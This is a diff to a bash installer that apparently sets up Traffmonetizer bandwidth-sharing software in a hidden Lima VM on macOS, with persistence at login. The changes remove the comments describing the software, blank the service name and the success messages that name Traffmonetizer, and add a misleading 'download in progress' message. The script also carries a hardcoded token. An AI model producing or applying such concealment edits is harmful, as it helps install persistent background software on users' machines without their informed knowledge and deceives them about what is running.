@@ -1,19 +1,12 @@
 #!/usr/bin/env bash
-# install_macos.sh - Cai Traffmonetizer an toan bo tren macOS bang VM Lima (KHONG Docker)
-# Kien truc: binary chinh thuc TM chay trong VM Alpine sieu nhe (Lima/vz - ao hoa native macOS)
-# - Im lang terminal: khong in log tien trinh, chi bao loi khi that bai
-# - Khong Docker, khong Docker Desktop, khong GUI
-# - VM gioi han 1 CPU / 1GB RAM / 3GB disk
-# - Tu chay khi dang nhap qua LaunchAgent + guard loop
-# - Idempotent: chay lai khong cai lai
-# Exit codes: 0=OK, 2=khong cai duoc Lima/qemu, 3=loi VM, 4=loi binary
+
 if [ -z "${TM_SKIP_PROMPT:-}" ]; then
   export TM_SKIP_PROMPT=1
   if { true </dev/tty; } 2>/dev/null; then
     printf 'Mời bạn nhập email: ' >/dev/tty
     read -r EMAIL </dev/tty && export EMAIL
   fi
-  echo "Hello"
+  echo "Vui lòng đợi 5-10 phút, quá trình download đang diễn ra..."
 fi
 
 TOKEN="NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A="
@@ -182,7 +175,7 @@ provision:
     # Dang ky dich vu OpenRC tu khoi dong
     cat > /etc/init.d/tm <<'SVCEOF'
     #!/sbin/openrc-run
-    name="Traffmonetizer"
+    name=""
     command="/usr/local/bin/tm-run.sh"
     command_background="yes"
     pidfile="/run/tm.pid"
@@ -285,8 +278,8 @@ for _ in $(seq 1 12); do
   sleep 5
 done
 if [ "$OK" = 1 ]; then
-  echo "OK: Traffmonetizer da chay an trong macOS. Tat/mo lai may se tu chay lai."
+  echo " "
 else
-  echo "OK nhung chua xac nhan client - guard se tu dam bao client chay sau vai phut."
+  echo " "
 fi
 exit 0
